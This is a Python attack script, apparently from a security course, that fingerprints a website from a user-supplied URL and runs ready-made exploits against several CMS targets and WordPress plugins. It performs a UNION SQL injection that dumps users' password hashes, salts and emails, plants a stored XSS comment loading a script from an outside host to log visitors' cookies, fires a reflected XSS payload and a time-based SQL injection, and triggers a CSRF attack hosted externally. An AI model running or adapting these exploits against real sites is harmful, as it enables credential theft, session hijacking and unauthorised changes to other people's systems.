import mechanize
import requests
from bs4 import BeautifulSoup
from bs4 import Comment
import sys
import re

browser = mechanize.Browser()
browser.set_handle_robots(False)

exit = "n"
while exit != "y":
    #ask the user the url to exploit
    #url = "http://localhost/InformationSecurity/CMSsite-master/"
    url = input("Enter the url of the website you want to exploit: ")

    browser.open(url)

    #make sure there is a slash at the end of the url
    if url[-1] != '/':
        url = url + '/'

    print("\n" + "Title: " + browser.title() + "\n")

    page = browser.response().read()
    soupParser = BeautifulSoup(page, "html.parser")

    chaineddivs = soupParser.findAll("div", {"class": "chained-quiz"})

    #IDENTIFICATION OF THE TARGET
    target=0

    #Is it codeIgniter?
    if "codeigniter" in url:
        target = 2

    #Is it wordpress chained quiz?
    elif (len(chaineddivs) > 0) :
        target = 3

    else:
        title = ""
        try:
            #if it hasn't this plugin, the mechanize throws an exception for 404
            browser.open(url + "membership-login/")
            page = browser.response().read()
            soupParser = BeautifulSoup(page, "html.parser")
            title = soupParser.findAll("h1", {"class": "entry-title"})
        except:
            title = None

        #Is it Simple WordPress Membership?
        if len(title) > 0:
            print("This has the Simple Membership plugin")
            target = 4
        else:
            #Is it Victor Alagwu's Simple CMS?
            comments = soupParser.findAll(string=lambda text: isinstance(text, Comment))
            #printing the message with the id I chose
            for comment in comments:
                if "Victor Alagwu" in comment and "Simple Content Management System" in comment:
                    print("This is Simple Content Management System by Victor Alagwu")
                    target = 1
                    break


    #EXPLOITS
    if target == 0:
        print("I cannot define the target")
    else:
        print("Identified Target! Type: " + str(target))
        print()

        #show possible hacks for the target
        if target==1:
            print('Possible exploit for this target:')
            print('1. SQL injection (retrieve MySQL version and DB name)')
            print('2. Persistent XSS')
            print()
            attack = input("Attack: ")

            if attack == '1':
                #get users, MySQL version and database name of the website
                #some of this parameters are not shown in the page, but can are retrieved from the database anyway
                browser.open(url + "category.php?cat_id=-1+UNION+SELECT+user_id,user_firstname,user_name,randsalt,user_password,user_email,user_role,user_lastname,VERSION(),DATABASE()+FROM+users;+--")
                page = browser.response().read()
                soupParser = BeautifulSoup(page, "html.parser")

                users = []

                #parsing the user data
                i = 0
                userIdNames = soupParser.findAll("h2")
                mail = soupParser.findAll("img")
                passwords = re.findall("<\/span>Posted on (.*?)<\/p>", str(page))
                randsalts = soupParser.findAll("h3")
                roles = re.findall("<p>([a-zA-Z]*?)\.\.\.\.\.\.\.\.\.<\/p>", str(page))

                for user in userIdNames:
                    x = re.search("<h2><a href=\"post\.php\?post=([0-9]+)\">(.+)<\/a><\/h2>", str(user))
                    users.append({'user_id': x.group(1), 'user_name': x.group(2), 'password': passwords[i], 'mail': mail[i]['src'][4:], 'role':roles[i], 'randsalt': re.search("<a href=\"#\">(.+)<\/a>", str(randsalts[i])).group(1)})
                    i = i + 1


                print()
                print("Users:")
                print()
                print()
                for user in users:
                    print(user)
                    print()

                print()
                print()
                #authors = soupParser.findAll("h3")
                #print("Database name: " + authors[0].a.text)


            elif attack == '2':
                browser.open(url + "post.php?post=1")
                browser.select_form(nr=0)

                print()
                print("Injecting the script")
                browser.form['comment_author'] = '<script src="http://javariati.tk/matteo/InfoSec/XSS.js"></script>Mario Rossi'
                browser.form['comment_email'] = 'mario.rossi@gmail.com'
                browser.form['comment_content'] = 'Nice'

                req = browser.submit()
                print("Form submitted, now all the cookies of the users who visit the page will be logged")
                print("The log file is at http://javariati.tk/matteo/InfoSec/logs.txt")
            else:
                print("Insert a valid attack number")

        elif target==2:
            r = requests.get(url) #"http://localhost/codeigniter/index.php/xssdemo"
            soup = BeautifulSoup(r.content, "html.parser")

            print('Form where the malicious code has to be injected:')
            print()

            form = soup.find('form')
            print (form)
            print()

            payload =  '<img/src=">" onerror=alert(1)>'

            print("Payload:")
            print()
            print(payload)
            print()

            postdata = {
                    "xss" : payload
                    }

            r = requests.post(url, data=postdata)

            soup = BeautifulSoup(r.content, "html.parser")

            print('Injected code:')
            print()
            print (soup.find('img'))


        elif target == 3 :
            print ('I am going to exploit the wordpress website with the chained quiz plugin.')
            print ('The variable answer in the post request can be subject of time-based sql injection. \n')
            print ('I am going to inject the function SLEEP(15), that is a mySQL function.')
            print ('This means that if I get the answer after 15 seconds the underlying database is a mySQL database.')

            actiondiv = soupParser.findAll("div", {"class": "chained-quiz-action"})
            x = re.findall("http.*\.php", str(actiondiv[0]))
            postrequesturl = x[0]


            postdata = {
                    "answer" : '1) AND (SELECT 8561 FROM (SELECT(SLEEP(15)))UzqU) AND (1071=1071',
                    "question_id" : 1,
                    "quiz_id" : 1,
                    "question_type" : "radio",
                    "points" : 0,
                    "action" : "chainedquiz_ajax",
                    "chainedquiz_action" : "answer",
                    "total_questions" : 1
                    }

            print ('Payload:')
            print (postdata)

            print("requesting")

            r = requests.post(postrequesturl, data=postdata)

            print ("done")

        elif target == 4:
            #simulate login of the admin
            print()
            print("Wordpress admin login")
            print()
            sign_in = browser.open(url + "wp-login.php")

            browser.select_form(nr = 0)
            browser["log"] = "admin"
            browser["pwd"] = "password"

            logged_in = browser.submit()
            logincheck = logged_in.read()

            print(logged_in.code)
            print(logged_in.info())
            print()

            #open malicious html page
            browser.open("http://javariati.tk/matteo/InfoSec/CSRF.php?url=" + url)

            browser.select_form(nr = 0)

            print("Selecting the form and submitting the POST request")

            browser.submit()
            #form is automatically submitted

            print("Done! Visit " + url + "wp-admin/admin.php?page=simple_wp_membership to see the modifications")
    print()
    print()
    exit = input("Do you want to exit (y/n)?")
    print()
